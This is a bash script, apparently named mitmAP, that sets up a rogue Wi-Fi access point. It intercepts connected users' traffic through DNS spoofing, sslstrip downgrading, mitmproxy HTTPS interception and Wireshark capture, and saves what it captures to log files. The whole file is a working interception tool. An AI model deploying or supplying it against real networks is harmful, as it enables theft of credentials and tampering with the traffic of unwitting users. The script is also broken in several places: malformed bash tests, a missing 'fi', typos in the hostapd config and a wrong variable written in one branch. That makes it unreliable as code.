#!/bin/bash

echo $'\n[>] Man in the Middle Access Point'


#-|-------------- Dependencies --------------|-

read -p "  [?] Install/Update dependencies? (y/n) " depen_if 
if ["$depen_if" == "y"]
then
	echo " [I] Checking/Installing dependencies, please wait..."
	apt-get -qq -y install dnsmasq mitmproxy hostapd screen wondershaper sslstrip &>/dev/null
	echo "  [I] System upgraded." 
fi


#-|----------- Wireless Interface -----------|-

read -p "  [?] Please enter the desired name of your wireless interface (for the AP): " ap_iface
read -p "  [?] Please enter the name of your internet connected interface: " net_iface
# echo this variable with escape characters
nmcfg="[main]\nplugins=keyfile\n\n[keyfile]\numanaged-devices=interface-name:"$ap_iface
echo "  [I] Killing wpa_supplicant on "$ap_iface"..."
kill -s SIGQUIT $(cat /var/run/wpa_supplicant.$ap_iface.pid)
ifconfig $ap_iface up


#-|----------------- DNSMASQ ----------------|-

read -p "  [?] Create new DNSMASQ config file at '/etc/dnsmasq.conf'? (y/n) " dnsmasq_if 
if ["$dnsmasq_if" == "y"]
then
	# echo this variable with escape characters
	dnsmasq_file="# Stops dnsmaq from reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface='$ap_iface$'\n# Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n# DNS addresses to send to the clients\nserver=8.8.8.8\nserver=8.8.4.4"
	echo "  [I] Deleting old config file..."
	rm /etc/dnsmasq.conf > /dev/null 2>&1
	echo "  [I] Writing config file..."
	echo -e $dnsmasq_file > /etc/dnsmasq.conf
else
	echo "  [I] Skipping..."
fi


#-|----------------- HOSTAPD ----------------|-

read -p "  [?] Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf'? (y/n) " hostapd_if
if ["$hostapd_if" == "y"]
then
	read -p "  [?] Please enter the SSID for the AP: " ssid
	read -p "  [?] Please enter the channel for the AP: " channel
	read -p "  [?] Enable WPA2 encryption? (y/n) " wpa_if
	if ["$wpa_if" == "y"]
	then
		read "  [?] Please enter the WPA2 passphrase for the AP: " wpa_passphrase
		# echo this variable with escape characters
		hostapd_file_wpa="interface"$ap_iface"\nssid="$ssid"\nhw_mode=g\nchannel="$channel"\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase="$wpa_passphrase"\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP"
		echo "  [I] Deleting old config file..."
		rm /etc/hostapd/hostapd.conf > /dev/null 2>&1
		echo "  [I] Writing config file..."
		echo -e $hostapd_file_wpa > /etc/hostapd/hostapd.conf
	else
		hostapd_file="interface"$ap_iface"\ndriver=n180211\nssid="$ssid"\nhw_mode=g\nchannel="$channel"\nmacaddr_acl=0\nauth_algs=1\nignore+broadcast_ssid=0"
		echo "  [I] Deleting old config file..."
		rm /etc/hostapd/hostapd.conf > /dev/null 2>&1
		echo "  [I] Writing config file..."
		echo -e $hostapd_file_wpa > /etc/hostapd/hostapd.conf
	fi
else
	echo "  [I] Skipping..."
fi


#-|---------------- AP CONFIG ---------------|-

echo "  [I] Configuring AP interface..."
ifconfig $ap_iface up 10.0.0.1 netmask 255.255.255.0
echo "  [I] Applying iptables rules..."
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface $net_iface -j MASQUERADE
iptables --append FORWARD --in-interface $ap_iface -j ACCEPT


#-|-------------- Speed Limit ---------------|-

read -p "  [?] Set speed limit for the clients? (y/n) " speed_if
if ["$speed_if" == "y"]
then
	read -p "  [?] Download speed limit (in KB/s): " speed_down
	# One day I'll make it so that it checks that a number was inputed, today is not that day.
	read -p "  [?] Upload speed limit (in KB/s): " speed_up
	echo "  [I] Setting speed limit on "$ap_iface"..."
	wondershaper $ap_iface $speed_up $speed_down
else
	echo "  [I] Skipping..."


#-|---------------- DNS Spoof ---------------|-

read -p "  [?] Spoof DNS? (y/n) " spoof_if
if ["$spoof_if" == "y"]
then
	read -p "  [?] How many domains do you want to spoof?: " dns_num
	echo "  [I] Backing up /etc/dnsmasq.conf"
	cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup
	# I'm not too sure this while loop is made correctly
	i=0
	while [ $i != $dns_num ]
	do
		dns_num_temp=$((i+1))
		read -p "  [?] "$dns_num_temp". Domain to spoof (exclude: 'www.'): " dns_domain
		read -p "  [?] Fake IP for domain "$dns_domain": " dns_ip
		dns_line="address=/"$dns_domain"/"$dns_ip
		echo -e $dns_line >> /etc/dnsmasq.conf
		i=$((i+1))
	done
else
	echo "  [I] Skipping..."
fi
/etc/init.d/dnsmasq stop > /dev/null 2>&1
pkill dnsmasq
dnsmasq


#-|-------------- SSL Stripping -------------|-

read -p "  [?] Use SSLSTRIP? (y/n) " sslstrip_if
if ["$sslstrip_if" == "y"]
then
	proxy_if="n"
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
	sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
	echo -e "  [I] Starting AP on "$ap_iface" in screen terminal...\n"
	screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf
	screen -S mitmap-sslstrip -m -d sslstrip -l 9000 -w mitmap-sslstrip.log
	read -p "  [?] START WIRESHARK? (y/n) " wireshark
	if ["$wireshark" == "y"]
	then
		echo "  [I] Starting WIRESHARK..."
		screen -S mitmap-wireshark -m -d wireshark -i $ap_iface -k -w mitmap-wireshark.pcap
	fi
	echo -e "TAIL started on mitmap-sslstrip.log... Wait for output... (press 'CTRL + C' to stop)\n"
	sleep 5
	tail -f mitmap-sslstrip.log


#-|------------- Traffic Capture ------------|-

else
	read -p "  [?] Capture traffic? (y/n) " proxy_if
	if ["$proxy_if" == "y"]
	then
		read -p "  [?] Capture HTTPS traffic too? (Need to install certificate on device) (y/n) " proxy_config
		if ["$proxy_config" == "y"]
		then
			echo "  [I] To install the certificate, go to 'http://mitm.it/' through mitmproxy and choose your OS."
			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
			iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
		else
			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
		fi
		sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
		echo -e "  [I] Starting AP on "$ap_iface" in screen terminal...\n"
		read -p "  [?] START WIRESHARK? (y/n) " wireshark
		if ["$wireshark" == "y"]
		then
			echo "  [I] Starting WIRESHARK..."
			screen -S mitmap-wireshark -m -d wireshark -i $ap_iface -k -w mitmap-wireshark.pcap
		fi
		screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf
		echo "  [I] Starting MITMPROXY in 5 seconds... (press q and y to exit) "
		sleep 5
		mitmproxy -T -w mitmap-proxy.mitmproxy
	else
		echo "  [I] Skipping..."
		read -p "  [?] START WIRESHARK? (y/n) " wireshark
		if ["$wireshark" == "y"]
		then
			echo "  [I] Starting WIRESHARK..."
			screen -S mitmap-wireshark -m -d wireshark -i $ap_iface -k -w mitmap-wireshark.pcap
		fi
		sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
		echo -e "  [I] Starting AP on "$ap_iface"...\n"
		hostapd /etc/hostapd.conf
	fi
fi

#-|-------------- Stopping --------------|-

echo ""
echo "  [!] Stopping..."
if ["$sslstrip_if" == "y" || "$proxy_if" == "y" || "$wireshark" == "y"]
then
	screen -S mitmap-hostapd -X stuff '^C\n'
	if ["$sslstrip_if" == "y"]
	then
		screen -S mitmap-sslstrip -X stuff '^C\n'
	fi
	if ["$wireshark" == "y"]
	then
		screen -S mitmap-wireshark -X stuff '^C\n'
	fi
fi
echo "  [I] Stopping DNSMASQ server..."
/etc/init.d/dnsmasq stop > /dev/null 2>&1
pkill dnsmasq
echo "  [I] Restoring old dnsmasq.cfg..."
mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1
echo "  [I] Deleting old dnsmasq.hosts..."
mv /etc/dnsmasq.hosts > /dev/null 2>&1
echo "  [I] Removing speed limit from"$ap_iface"..."
wondershaper clear $ap_iface > /dev/null 2>&1
if ["$proxy_if" == "y"]
then
	if ["$wireshark" == "y"]
	then
		echo "  [I] Traffic has been saved to the file 'mitmap-proxy.mitmproxy' and to the file 'mitmap-wireshark.pcap'. View the '.mitmproxy' file later with 'mitmproxy -r [file]'."
	fi
	echo "  [I] Traffic has been saved to the file 'mitmap-proxy.mitmproxy'. View the file later with 'mitmproxy -r [file]'."
fi
if ["$sslstrip_if" == "y"]
then
	if ["$wireshark" == "y"]
	then
		echo "  [I] Traffic has been saved to the file 'mitmap-sslstrip.log' and to the file 'mitmap-wireshark.pcap'."
	fi
	echo "  [I] Traffic has been saved to the file 'mitmap-sslstrip.log'."
fi
echo -e "  [!] WARNING: If you want to use the AP interface normally, a reboot is required.\n"
echo "[I] mitmAP module stopped."
